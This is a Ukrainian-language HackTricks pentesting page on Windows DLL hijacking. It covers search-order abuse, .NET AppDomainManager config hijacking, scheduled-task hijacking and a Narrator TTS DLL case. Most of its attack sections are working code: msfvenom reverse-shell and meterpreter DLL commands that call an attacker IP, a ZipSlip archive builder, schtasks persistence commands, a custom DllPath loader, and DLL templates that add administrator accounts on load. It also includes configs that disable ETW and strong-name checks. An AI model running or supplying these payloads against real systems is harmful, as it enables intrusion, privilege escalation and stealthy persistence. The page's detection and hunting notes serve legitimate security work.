# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking полягає в тому, щоб змусити довірену програму завантажити шкідливу DLL. Цей термін охоплює кілька тактик, як-от **DLL Spoofing, Injection і Side-Loading**. Їх переважно використовують для виконання коду та забезпечення персистентності, а рідше — для підвищення привілеїв. Хоча тут основна увага приділяється підвищенню привілеїв, метод hijacking залишається незмінним для різних цілей.

### Поширені техніки

Для DLL hijacking застосовують кілька методів; ефективність кожного залежить від стратегії завантаження DLL програмою:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Заміна справжньої DLL на шкідливу, за потреби з використанням DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: Розміщення шкідливої DLL у шляху пошуку, який має вищий пріоритет за шлях до легітимної DLL, з використанням порядку пошуку програми.
3. **Phantom DLL Hijacking**: Створення шкідливої DLL, яку програма завантажить, вважаючи її необхідною, але відсутньою DLL.
4. **DLL Redirection**: Зміна параметрів пошуку, як-от `%PATH%`, або файлів `.exe.manifest` / `.exe.local`, щоб спрямувати програму до шкідливої DLL.
5. **WinSxS DLL Replacement**: Заміна легітимної DLL на шкідливу копію в каталозі WinSxS; цей метод часто пов’язаний із DLL side-loading.
6. **Relative Path DLL Hijacking**: Розміщення шкідливої DLL у контрольованому користувачем каталозі разом із копією програми; це нагадує техніки Binary Proxy Execution.

Програма також може реалізувати **власний завантажувач DLL**. Привілейований процес може перебирати файли в дочірньому каталозі, наприклад `Libraries` або `Plugins`, і передавати вибрану DLL допоміжному процесу, не використовуючи звичайний порядок пошуку DLL у Windows. Якщо інший обліковий запис може створювати файли саме в цьому каталозі, розглядайте це як напрямок для перевірки: з’ясуйте ідентичність процесу, ефективні ACL каталогу, правило вибору файлів і наявність доступного шляху до завантаження. Сам факт, що каталог поруч із виконуваним файлом доступний для запису, не доводить, що процес завантажує звідти DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Класичне DLL sideloading — не єдиний спосіб змусити довірений процес **.NET Framework** завантажити код зловмисника. Якщо цільовий виконуваний файл є **керованою** програмою, CLR також перевіряє **файл конфігурації програми**, названий відповідно до виконуваного файла (наприклад, `Setup.exe.config`). У цьому файлі можна вказати власний **AppDomainManager**. Якщо конфігурація посилається на контрольовану зловмисником збірку, розміщену поруч із EXE, CLR завантажує її **до виконання звичайного коду програми**, і вона запускається в довіреному процесі.<sup>[[24]](#references)</sup>

Згідно зі схемою конфігурації .NET Framework від Microsoft, для використання власного менеджера мають бути присутні обидва елементи — `<appDomainManagerAssembly>` і `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Мінімальна конфігурація:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Мінімальний менеджер:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Практичні примітки:
- Це техніка **лише для .NET Framework**. Вона залежить від розбору конфігурації CLR, а не від порядку пошуку DLL у Win32.
- Хост має бути справжнім **керованим EXE**. Швидка перевірка: `sigcheck -m target.exe`, `corflags target.exe` або перевірте наявність **CLR Runtime Header** у метаданих PE.
- Назва конфігураційного файла має точно збігатися з назвою виконуваного файла (`<binary>.config`); зазвичай він розташований **поруч з EXE**.
- Це корисно зі **підписаними бінарними файлами Microsoft/постачальника**, оскільки довірений EXE залишається незмінним, а шкідлива керована збірка виконується в тому самому процесі.
- Якщо у вас уже є доступний для запису каталог інсталятора/оновлень, AppDomainManager hijacking можна використати як **перший етап**, а потім застосувати класичний DLL sideloading або reflective loading для наступних етапів.

### AppDomainManager як завантажувач і засіб підготовки scheduled task

Практична схема вторгнення полягає у використанні довіреного керованого EXE разом зі шкідливими `*.config` і DLL AppDomainManager, яка виконує роль лише **невеликого bootstrapper**:<sup>[[25]](#references)</sup>

1. Користувач запускає підписаний .NET інсталятор або засіб оновлення з правдоподібного розташування, наприклад `%USERPROFILE%\Downloads`.
2. Файл конфігурації поруч із EXE змушує CLR завантажити збірку зловмисника **до початку виконання логіки легітимної програми**.
3. Шкідливий менеджер виконує **перевірку шляху** (наприклад, продовжує роботу, лише якщо хостовий EXE запущено з `Downloads`, і дозволяє запуск другого етапу лише з `%LOCALAPPDATA%`).
4. Якщо перевірка успішна, він завантажує справжній payload у шлях, доступний для запису користувачеві, наприклад `%LOCALAPPDATA%\PerfWatson2.exe`, і налаштовує persistence за допомогою scheduled task.

Чому цей варіант важливий:
- Підписаний хостовий EXE залишається незмінним, тож під час triage, що перевіряє лише хеш основного бінарного файла, компрометацію можуть не виявити.
- Поширена проста **path-based anti-analysis**: перенесення тріади ZIP/EXE/DLL на Desktop, у Temp або в шлях пісочниці може навмисно перервати ланцюжок.
- DLL AppDomainManager першого етапу може бути невеликою та малопомітною, тоді як справжній implant завантажується пізніше.

Мінімальний приклад persistence, який часто трапляється в цій схемі:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Нотатки:
- ` /rl highest` означає **найвищий доступний рівень** для цього користувача/сеансу; сам по собі він не гарантує підвищення привілеїв до SYSTEM.
- Цю техніку часто доречніше класифікувати як **виконання/закріплення через зловживання конфігурацією .NET**, а не як класичний hijacking через відсутню DLL у порядку пошуку, хоча оператори часто поєднують обидва методи.

Орієнтири для виявлення:
- Підписані виконувані файли .NET, запущені з **каталогів розпакованих ZIP-файлів**, `Downloads`, `%TEMP%` або інших доступних для запису користувачеві каталогів, поруч із якими є файл `<exe>.config`.
- Нові заплановані завдання, дія яких вказує на `%LOCALAPPDATA%`, `%APPDATA%` або `Downloads`, а їхні назви імітують засоби оновлення браузера/постачальника.
- Короткоживучі керовані процеси-завантажувачі, які одразу завантажують інший EXE, а потім запускають `schtasks.exe`.
- Зразки, які завершують роботу раніше, якщо шлях до виконуваного файлу не відповідає очікуваному каталогу профілю користувача.

### Перехоплення наявного запланованого завдання для повторного запуску ланцюжка sideload

Для закріплення не шукайте лише **створення нового завдання**. Деякі групи зловмисників чекають, доки легітимний інсталятор створить **звичайне завдання оновлення**, а потім **переписують дію завдання**, щоб наявні назва, автор і тригер залишалися звичними для захисників.

Багаторазовий алгоритм:
1. Встановіть/запустіть легітимне програмне забезпечення та визначте завдання, яке воно зазвичай створює.
2. Експортуйте XML завдання та зафіксуйте поточні значення `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Замініть лише дію, щоб завдання запускало ваш **довірений EXE-хост** із проміжного каталогу, доступного для запису користувачеві; він виконає sideload або завантажить справжній payload через AppDomain.
4. Повторно зареєструйте завдання з тією самою назвою, замість створення нового, очевидного артефакту закріплення.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Чому це менш помітно:
- Назва завдання все ще може виглядати легітимною (наприклад, як назва засобу оновлення від постачальника).
- Його запускає **служба Task Scheduler**, тож під час перевірки батьківського процесу чи предків часто виявляється очікуваний ланцюжок планувальника, а не `explorer.exe`.
- Команди DFIR, які шукають лише **нові назви завдань**, можуть пропустити завдання, яке вже було зареєстроване, але його дія тепер вказує на `%LOCALAPPDATA%`, `%APPDATA%` або інший шлях, контрольований зловмисником.

Швидкі способи пошуку:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Порівнюйте XML-файли з `C:\Windows\System32\Tasks\*` і метадані з `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` з базовим знімком.
- Створюйте сповіщення, коли **завдання засобу оновлення, що виглядає як продукт постачальника**, запускається з **каталогів, доступних для запису користувачам**, або запускає .NET EXE разом із файлом `*.config` у тій самій папці.

> [!TIP]
> Покроковий ланцюжок, який поєднує HTML staging, конфігурації AES-CTR і .NET-імпланти з DLL sideloading, описано в наведеному нижче робочому процесі.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Пошук відсутніх DLL

Найпоширеніший спосіб знайти відсутні DLL у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із пакета sysinternals і **встановити такі 2 фільтри**:

![Common Techniques - Пошук відсутніх DLL: Найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon із пакета sysinternals і встановити такі 2 фільтри](<../../../images/image (961).png>)

![Common Techniques - Пошук відсутніх DLL: Найпоширеніший спосіб знайти відсутні DLL у системі — запустити procmon із пакета sysinternals і встановити такі 2 фільтри](<../../../images/image (230).png>)

і відображати лише **активність файлової системи**:

![Common Techniques - Пошук відсутніх DLL: і відображати лише активність файлової системи](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні DLL загалом**, залиште програму запущеною на кілька **секунд**.\
Якщо ви шукаєте **відсутню DLL у певному виконуваному файлі**, встановіть додатковий фільтр, наприклад **"Process Name" "contains" `<exec name>`**, запустіть його та зупиніть захоплення подій.<sup>[[9]](#references)</sup>

## Експлуатація відсутніх DLL

Щоб підвищити привілеї, шукайте **DLL, яку привілейований процес намагається завантажити** з розташування, доступного вам для запису. Таке може статися, якщо ви контролюєте каталог, який перевіряється раніше за каталог із легітимною DLL, або якщо запитувана DLL не існує й ви можете записати файл в один із каталогів пошуку.

### Порядок пошуку DLL

**У** [**документації Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можна дізнатися, як саме завантажуються DLL.**

**Програми Windows** шукають DLL за заздалегідь визначеним набором шляхів у певній послідовності. Проблема DLL hijacking виникає, коли шкідливу DLL навмисно розміщують в одному з цих каталогів, щоб вона завантажилася раніше за справжню DLL. Щоб запобігти цьому, програма має використовувати абсолютні шляхи до потрібних їй DLL.

Нижче наведено **порядок пошуку DLL у 32-бітних** системах:

1. Каталог, з якого завантажено програму.
2. Системний каталог. Щоб отримати шлях до нього, скористайтеся функцією [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya).(_C:\Windows\System32_)
3. 16-бітний системний каталог. Функції для отримання шляху до нього немає, але пошук у ньому виконується. (_C:\Windows\System_)
4. Каталог Windows. Щоб отримати шлях до нього, скористайтеся функцією [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya).
   1. (_C:\Windows_)
5. Поточний каталог.
6. Каталоги, перелічені в змінній середовища PATH. Зверніть увагу: сюди не входить шлях для конкретної програми, указаний у розділі реєстру **App Paths**. Ключ **App Paths** не використовується під час визначення шляху пошуку DLL.

Це **стандартний** порядок пошуку, коли **SafeDllSearchMode** увімкнено. Коли його вимкнено, поточний каталог переміщується на друге місце. Щоб вимкнути цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть для нього значення 0 (типове значення — увімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликати з параметром **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі виконуваного модуля, який завантажує **LoadLibraryEx**.

Нарешті, DLL можна завантажити за абсолютним шляхом, а не за назвою. У такому разі Windows шукатиме саму DLL лише за цим шляхом; залежності, запитані за назвою, і далі шукатимуться у відповідному порядку.

Існують й інші способи змінити порядок пошуку, але я не пояснюватиму їх тут.

### Об’єднання довільного запису файлу з перехопленням відсутньої DLL

**Пов’язана техніка:** [перемикання точки монтування під контролем oplock проти привілейованого виправлення](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. За допомогою фільтрів **ProcMon** (`Process Name` = цільовий EXE, `Path` закінчується на `.dll`, `Result` = `NAME NOT FOUND`) зберіть назви DLL, які процес шукає, але не знаходить.<sup>[[14]](#references)</sup>
2. Якщо бінарний файл запускається **за розкладом/як служба**, розміщення DLL з однією з цих назв у **каталозі програми** (пункт №1 у порядку пошуку) призведе до її завантаження під час наступного запуску. В одному випадку зі сканером .NET процес шукав `hostfxr.dll` у `C:\samples\app\` перед завантаженням справжньої копії з `C:\Program Files\dotnet\fxr\...`.
3. Створіть payload DLL (наприклад, reverse shell) з будь-яким експортом: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Якщо ваш примітив — це **довільний запис у стилі ZipSlip**, створіть ZIP-файл із записом, який виходить за межі каталогу розпакування, щоб DLL потрапила до каталогу програми:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Доставте архів до inbox/share, за яким стежать; коли заплановане завдання повторно запустить процес, той завантажить шкідливу DLL і виконає ваш код від імені облікового запису служби.

### Примусове sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath

Просунутий спосіб детерміновано вплинути на шлях пошуку DLL нового процесу — задати поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою нативних API ntdll. Якщо вказати контрольований зловмисником каталог, цільовий процес, який шукає імпортовану DLL за назвою (без абсолютного шляху та без використання безпечних прапорців завантаження), можна змусити завантажити шкідливу DLL із цього каталогу.

Основна ідея
- Створіть параметри процесу за допомогою RtlCreateProcessParametersEx і вкажіть власний DllPath, що веде до контрольованої вами папки (наприклад, каталогу, де розташований ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли цільовий виконуваний файл шукатиме DLL за назвою, завантажувач перевірить указаний DllPath під час пошуку, що забезпечить надійне sideloading, навіть якщо шкідлива DLL розташована не поруч із цільовим EXE.

Примітки та обмеження
- Це впливає на дочірній процес, який створюється; це відрізняється від SetDllDirectory, що впливає лише на поточний процес.
- Цільовий процес має імпортувати DLL або викликати LoadLibrary за назвою (без абсолютного шляху та без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко задані абсолютні шляхи не можна перехопити. Експорт із перенаправленням і SxS можуть змінювати пріоритет.

Мінімальний приклад на C (ntdll, wide strings, спрощена обробка помилок):

<details>
<summary>Повний приклад на C: примусове DLL sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Приклад практичного використання
- Розмістіть шкідливий xmllite.dll (який експортує потрібні функції або проксіює виклики до справжньої бібліотеки) у каталозі DllPath.
- Запустіть підписаний бінарний файл, який, як відомо, шукає xmllite.dll за назвою за допомогою описаної вище техніки. Завантажувач знаходить імпорт через вказаний DllPath і виконує sideloading вашої DLL.

Цю техніку спостерігали в реальних атаках для побудови багатоступеневих ланцюжків sideloading: початковий запускник скидає допоміжну DLL, яка потім запускає підписаний Microsoft бінарний файл, вразливий до hijacking, із власним DllPath, щоб примусово завантажити DLL зловмисника з проміжного каталогу.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking через `.exe.config`

Для цілей на **.NET Framework** sideloading можна виконати **до `Main()`** без модифікації пам’яті, зловживаючи сусіднім файлом **`.exe.config`** програми. Замість того щоб покладатися лише на порядок пошуку DLL Win32, зловмисник розміщує легітимний .NET EXE поруч зі шкідливим конфігураційним файлом і однією або кількома контрольованими зловмисником збірками.

Як працює цей ланцюжок:<sup>[[15]](#references)[[22]](#references)</sup>
1. Запускається EXE-хост, і **CLR читає `<exe>.config`**.
2. У конфігурації задаються **`<appDomainManagerAssembly>`** і **`<appDomainManagerType>`**, щоб середовище виконання створило контрольований зловмисником `AppDomainManager`.
3. Шкідливий менеджер отримує можливість виконання **до `Main()`** усередині довіреного процесу-хоста.
4. Та сама конфігурація може змусити CLR спочатку шукати локальні збірки (наприклад, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) і послабити перевірку середовища виконання та телеметрію без inline-патчів.

Схема в стилі кампанії (точна вкладеність може відрізнятися залежно від директиви / версії CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Чому це корисно:
- **`<probing privatePath="."/>`** обмежує пошук збірок каталогом програми, перетворюючи його на передбачувану поверхню для sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** передають виконання коду зловмисника під час ініціалізації CLR, ще до запуску логіки легітимної програми.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** може дозволити програмі з повною довірою завантажувати непідписані або змінені збірки без помилки перевірки strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** запобігає перенаправленням publisher policy на новіші збірки.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** робить вибір середовища виконання більш передбачуваним.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** особливо цікаве, оскільки **CLR вимикає власну видимість через ETW** у конфігурації, а не через виправлення `EtwEventWrite` імплантом у пам’яті.

Операційна схема, яку спостерігали в недавніх кампаніях:
- Етап 1 скидає `setup.exe`, `setup.exe.config` і локальні збірки.
- Етап 2 копіює їх у правдоподібний каталог **оновлень AppData**, перейменовує хост, наприклад на `update.exe`, і повторно запускає його через **заплановане завдання**.
- Етап 3 перевіряє контекст виконання (наприклад, чи очікуваним батьківським процесом є `svchost.exe`, запущений Планувальником завдань), перш ніж завантажити фінальний RAT DLL/export.

Ідеї для пошуку:
- Підписані або інші легітимні **виконувані файли .NET**, що запускаються з підозрілими суміжними файлами **`.config`** у розташуваннях, доступних для запису користувачам.
- Файли `.config`, що містять **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** або **`etwEnable enabled="false"`**.
- Заплановані завдання, які повторно запускають перейменовані бінарні файли оновлень із **`%LOCALAPPDATA%`** або каталогів програми на кшталт `\bin\update\`.
- Ланцюжки батьківських і дочірніх процесів, у яких заплановане завдання запускає довірений хост .NET, що одразу завантажує збірки не від виробника з власного каталогу.

#### Винятки з порядку пошуку dll у документації Windows

У документації Windows зазначено кілька винятків зі стандартного порядку пошуку DLL:

- Коли виявлено **DLL з такою самою назвою, як у вже завантаженої в пам’ять**, система обходить звичайний пошук. Натомість вона перевіряє наявність перенаправлення та маніфесту, а потім за замовчуванням використовує DLL, уже завантажену в пам’ять. **У цьому випадку система не шукає DLL**.
- Якщо DLL визначено як **відомий DLL** для поточної версії Windows, система використовує її версію відомої DLL разом із будь-якими DLL-залежностями, **не виконуючи пошук**. Реєстровий ключ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих відомих DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони вказані лише за своїми **іменами модулів**, незалежно від того, чи початкову DLL було знайдено за повним шляхом.

### Підвищення привілеїв

**Вимоги**:

- Знайти процес, який працює або працюватиме з **іншими привілеями** (horizontal or lateral movement) і якому **бракує DLL**.
- Переконатися, що є **доступ на запис** до будь-якого **каталогу**, у якому здійснюватиметься **пошук DLL**. Це може бути каталог виконуваного файла або каталог у системному шляху.

За замовчуванням такі передумови трапляються рідко: у привілейованих виконуваних файлів зазвичай немає відсутніх залежностей DLL, а звичайні користувачі зазвичай не можуть записувати дані в каталоги системного шляху пошуку. Однак неправильно налаштовані середовища можуть мати обидві ці умови.\
Якщо вимоги виконано, перевірте проєкт [UACME](https://github.com/hfiref0x/UACME). Хоча його основна мета — обхід UAC, він містить PoC для DLL-hijacking у певних версіях Windows, які часто можна адаптувати до знайденого каталогу, доступного для запису.

Зверніть увагу, що **перевірити свої дозволи на папку** можна так:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

А також **перевірте дозволи на всі папки в PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Також можна перевірити імпорти виконуваного файлу та експорти DLL за допомогою:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Для повного посібника про те, як **зловживати DLL Hijacking для підвищення привілеїв**, маючи дозволи на запис до папки **System Path**, дивіться:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)перевірить, чи маєте ви дозволи на запис до будь-якої папки в system PATH.\
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості — це функції **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ і _Write-HijackDll._

### Приклад

Якщо ви знайдете сценарій, який можна експлуатувати, однією з найважливіших умов успішної експлуатації буде **створити dll, яка експортує щонайменше всі функції, що виконуваний файл імпортуватиме з неї**. У будь-якому разі зауважте, що DLL Hijacking стане в пригоді для [підвищення рівня цілісності з Medium до High **(обходячи UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з[ **High Integrity до SYSTEM**](../index.html#from-high-integrity-to-system)**.** Приклад **створення коректної dll** можна знайти в цьому дослідженні DLL hijacking, присвяченому виконанню через DLL hijacking: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **наступному розділі** ви знайдете **базові фрагменти коду dll**, які можуть стати в пригоді як **шаблони** або для створення **dll з експортованими функціями, які не є обов'язковими**.

## **Створення та компіляція DLL**

### **DLL Proxifying**

По суті, **DLL proxy** — це DLL, здатна **виконати ваш шкідливий код під час завантаження**, а також **надавати** функції та **працювати** так, як **очікується**, **переспрямовуючи всі виклики до справжньої бібліотеки**.

За допомогою інструмента [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) можна **вказати виконуваний файл і вибрати бібліотеку**, для якої потрібно створити проксі, та **згенерувати proxified dll**, або **вказати DLL** і **згенерувати proxified dll**.

### **Meterpreter**

**Отримати rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Отримати meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Створіть користувача (x86, версії x64 я не знайшов):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Власний

У багатьох випадках DLL, яку ви компілюєте, має **експортувати кожну функцію, імпортовану процесом-жертвою**. Якщо потрібного експорту бракує, бінарний файл не може його розпізнати, і експлойт не спрацьовує.

<details>
<summary>Шаблон C DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Альтернативна C DLL із точкою входу потоку</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Кейс: викрадення DLL локалізації TTS у Narrator OneCore (спеціальні можливості/ATs)

Windows Narrator.exe і досі під час запуску перевіряє передбачувану DLL локалізації для певної мови, яку можна викрасти для довільного виконання коду та закріплення в системі.<sup>[[7]](#references)</sup>

Ключові факти
- Шлях перевірки (поточні збірки): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Застарілий шлях (старіші збірки): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо DLL, доступна для запису й контрольована зловмисником, розташована за шляхом OneCore, її буде завантажено, а `DllMain(DLL_PROCESS_ATTACH)` виконається. Експорти не потрібні.

Виявлення за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` і `Operation is Load Image` або `CreateFile`.
